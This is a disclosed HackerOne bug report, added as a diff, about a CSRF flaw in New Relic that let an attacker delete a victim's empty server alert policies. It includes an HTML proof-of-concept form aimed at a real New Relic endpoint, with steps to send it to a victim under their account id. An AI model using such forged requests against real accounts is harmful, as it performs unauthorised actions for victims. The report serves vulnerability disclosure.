@@ -1,0 +1,28 @@
+ReportLink:https://hackerone.com/reports/123095
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/amit29sept
+ReportedTo:New Relic(newrelic)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:20.03.2017 1:40:24
+
+Summary:
+
+A CSRF vulnerability is found in the application, using which an attacker can delete all empty server policy.
+
+Steps to reproduce
+
+Create a html file using following code:
+<html>
+  <body>
+    <form action="https://rpm.newrelic.com/accounts/1272523/server_alert_policies/remove_empty_policies">
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+send it to victim.
+
+Note : Make sure you change the account id to the victims id.
